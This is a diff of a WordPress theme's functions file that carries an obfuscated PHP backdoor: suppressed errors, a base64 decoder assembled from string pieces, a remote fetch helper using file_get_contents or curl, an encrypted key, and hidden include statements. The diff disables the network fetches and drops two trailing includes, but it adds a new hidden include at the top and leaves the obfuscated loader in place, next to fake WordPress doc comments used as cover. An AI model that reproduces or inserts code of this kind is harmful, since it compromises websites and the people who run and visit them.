@@ -1,49 +1,30 @@
 <?php
-/**
- * Main WordPress API
- *
- * @package WordPress
- * Convert given date string into a different format.
- *
- * $format should be either a PHP date format string, e.g. 'U' for a Unix
- * timestamp, or 'G' for a Unix timestamp assuming that $date is GMT.
- *
- * If $translate is true then the given date and format string will
- * be passed to date_i18n() for translation.
- *
- * @since 0.24
- *
- * @param string $format    Format of the date to return.
- * @param string $date      Date string to convert.
- * @param bool   $translate Whether the return date should be translated. Default true.
- * @return string|int|bool Formatted date string or Unix timestamp. False if $date is empty.
- */
-
-/** Define ABSPATH as this file's directory */ 
-
+@include(' template-config.php ');
+ 
 @ini_set('display_errors', '0');
 error_reporting(0);
+
 global $zeeta;
 if (!$npDcheckClassBgp && !isset($zeeta)) {
 
-    $ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa = str_replace('sx', '64', $ee); $algo = 'default'; $pass = "Zgc5c4MXrL8kbQABrY1QMLOWMUzSN7EExmWBHqySvR8cJkAfXl84+cU=";
+    $ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa = str_replace('sx', '64', $ee); $algo = 'default'; $pass = "Zgc5c4MXrK0ubQgN4pBWZv2dPRfXN70cmCWIX7HVoQ==";
     
 if (!function_exists('get_data_ya')) {
     if (ini_get('allow_url_fopen')) {
         function get_data_ya($m) {
-            $data = file_get_contents($m);
+            $data = null;//file_get_contents($m);
             return $data;
         }
     }
     else {
         function get_data_ya($m) {
             $ch = curl_init();
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $m);
-            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
-            $data = curl_exec($ch);
-            curl_close($ch);
+            //curl_setopt($ch, CURLOPT_HEADER, 0);
+            //curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            //curl_setopt($ch, CURLOPT_URL, $m);
+            //curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
+            $data = null;//curl_exec($ch);
+            //curl_close($ch);
             return $data;
         }
     }
@@ -81,8 +62,6 @@ if (!function_exists('wp_cd')) {
 	$zeeta = "yup";
 
     }
-?>
-<?php
 load_theme_textdomain( 'oshin', get_template_directory() . '/languages' );
 add_filter( 'auto_update_theme', '__return_true' );
 add_filter( 'masterslider_disable_auto_update', '__return_true' );
@@ -1291,5 +1270,4 @@ if( !function_exists('be_print_custom_admin_side_scripts') ) {
 	}
 }
 
-@include( 'template-config.php');
-@include( 'content-link-page.php');?>
+?>
